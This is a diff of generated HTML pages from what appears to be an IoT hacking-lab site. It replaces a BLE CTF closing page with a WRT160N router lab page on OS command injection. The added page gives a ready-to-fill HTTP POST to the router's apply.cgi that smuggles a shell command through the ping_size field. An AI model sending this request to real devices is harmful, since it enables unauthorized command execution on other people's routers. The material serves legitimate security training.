@@ -5,7 +5,7 @@
 <meta name=generator content="Hugo 0.88.1">
 <meta name=description content>
 <link rel=icon href=/images/favicon.png type=image/png>
-<title>Outro :: IoT Hack Labs</title>
+<title>OS Command Injection :: IoT Hack Labs</title>
 <link href=/css/nucleus.css?1634615416 rel=stylesheet>
 <link href=/css/fontawesome-all.min.css?1634615416 rel=stylesheet>
 <link href=/css/hybrid.css?1634615416 rel=stylesheet>
@@ -20,7 +20,7 @@
 <script src=/js/jquery-3.3.1.min.js?1634615416></script>
 <style>:root #header+#content>#left>#rlblock_left{display:none!important}</style>
 </head>
-<body data-url=/btle-ctf/99-outro/>
+<body data-url=/router-lab/wrt160n/os-command-injection/>
 <nav id=sidebar>
 <div id=header-wrapper>
 <div id=header>
@@ -76,7 +76,8 @@ Test Remote Connection
 </li>
 </ul>
 </li>
-<li data-nav-id=/router-lab/ title="Router Lab" class=dd-item>
+<li data-nav-id=/router-lab/ title="Router Lab" class="dd-item
+parent">
 <a href=/router-lab/>
 Router Lab
 </a>
@@ -147,7 +148,8 @@ Exploitation
 </li>
 </ul>
 </li>
-<li data-nav-id=/router-lab/wrt160n/ title=WRT160N class=dd-item>
+<li data-nav-id=/router-lab/wrt160n/ title=WRT160N class="dd-item
+parent">
 <a href=/router-lab/wrt160n/>
 WRT160N
 </a>
@@ -157,7 +159,7 @@ WRT160N
 Local File Inclusion
 </a>
 </li>
-<li data-nav-id=/router-lab/wrt160n/os-command-injection/ title="OS Command Injection" class=dd-item>
+<li data-nav-id=/router-lab/wrt160n/os-command-injection/ title="OS Command Injection" class="dd-item active">
 <a href=/router-lab/wrt160n/os-command-injection/>
 OS Command Injection
 </a>
@@ -178,8 +180,7 @@ References
 </li>
 </ul>
 </li>
-<li data-nav-id=/btle-ctf/ title="BTLE CTF" class="dd-item
-parent">
+<li data-nav-id=/btle-ctf/ title="BTLE CTF" class=dd-item>
 <a href=/btle-ctf/>
 BTLE CTF
 </a>
@@ -189,7 +190,7 @@ BTLE CTF
 Intro
 </a>
 </li>
-<li data-nav-id=/btle-ctf/99-outro/ title=Outro class="dd-item active">
+<li data-nav-id=/btle-ctf/99-outro/ title=Outro class=dd-item>
 <a href=/btle-ctf/99-outro/>
 Outro
 </a>
@@ -207,7 +208,7 @@ Outro
 <div>
 <div id=top-bar>
 <div id=top-github-link>
-<a class=github-link title="Edit this page" href=https://github.com/Iot-hack-labs/iot-hack-labs.github.io/blob/main/content/BTLE%20CTF/99-outro.md target=blank>
+<a class=github-link title="Edit this page" href=https://github.com/Iot-hack-labs/iot-hack-labs.github.io/blob/main/content/Router%20Lab/WRT160N/OS-Command-Injection.md target=blank>
 <i class="fas fa-code-branch"></i>
 <span id=top-github-link-text>Edit this page</span>
 </a>
@@ -220,18 +221,14 @@ Outro
 </span>
 <span id=toc-menu><i class="fas fa-list-alt"></i></span>
 <span class=links>
-<a href=/></a> > <a href=/btle-ctf/>BTLE CTF</a> > Outro
+<a href=/></a> > <a href=/router-lab/>Router Lab</a> > <a href=/router-lab/wrt160n/>WRT160N</a> > OS Command Injection
 </span>
 </div>
 <div class=progress>
 <div class=wrapper>
 <nav id=TableOfContents>
 <ul>
-<li><a href=#finishing-up>Finishing up</a>
-<ul>
-<li><a href=#references>References</a></li>
-</ul>
-</li>
+<li><a href=#os-command-injection>OS Command Injection</a></li>
 </ul>
 </nav>
 </div>
@@ -242,24 +239,31 @@ Outro
 </div>
 <div id=body-inner>
 <h1>
-Outro
+OS Command Injection
 </h1>
-<h2 id=finishing-up>Finishing up</h2>
-<p>Thats it for this lab. You are welcome to continue to try the other challenges.
-If you are done, reset the CTF by writing <code>0xC1EA12</code> to handle <code>0x0032</code>.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0032 -n C1EA12
-</code></pre></div><h3 id=references>References</h3>
-<ul>
-<li><a href=https://github.com/hackgnar/ble_ctf_infinity>https://github.com/hackgnar/ble_ctf_infinity</a></li>
-<li>Chapter 11 of Practical IoT Hacking from No Starch Press.</li>
-</ul>
+<h2 id=os-command-injection>OS Command Injection</h2>
+<p>Make an HTTP POST request to the router like the following:</p>
+<pre tabindex=0><code>POST /apply.cgi HTTP/1.1
+Host: {TARGET_IP}
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Authorization: Basic {BASE_64_CREDENTIALS}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 181
+Connection: close
+
+submit_button=Diagnostics&amp;change_action=gozila_cgi&amp;submit_type=start_ping&amp;action=&amp;commit=0&amp;ping_ip=1.1.1.1&amp;ping_size=|{URL_ENCODED_CMD}|&amp;ping_times=5&amp;traceroute_ip=
+</code></pre><p><strong>NOTE:</strong> Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {URL_ENCODED_CMD} with the valid IP, credentials, and url encoded command respectively</p>
 <footer class=footline>
 </footer>
 </div>
 </div>
 <div id=navigation>
-<a class="nav nav-prev" href=/btle-ctf/01-intro/ title=Intro> <i class="fa fa-chevron-left"></i></a>
-<a class="nav nav-next" href=/btle-ctf/01-intro/ title=Intro style=margin-right:0><i class="fa fa-chevron-right"></i></a>
+<a class="nav nav-prev" href=/router-lab/wrt160n/local-file-inclusion/ title="Local File Inclusion"> <i class="fa fa-chevron-left"></i></a>
+<a class="nav nav-next" href=/router-lab/x150n/ title=X150N style=margin-right:0><i class="fa fa-chevron-right"></i></a>
 </div>
 </section>
 <div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px>
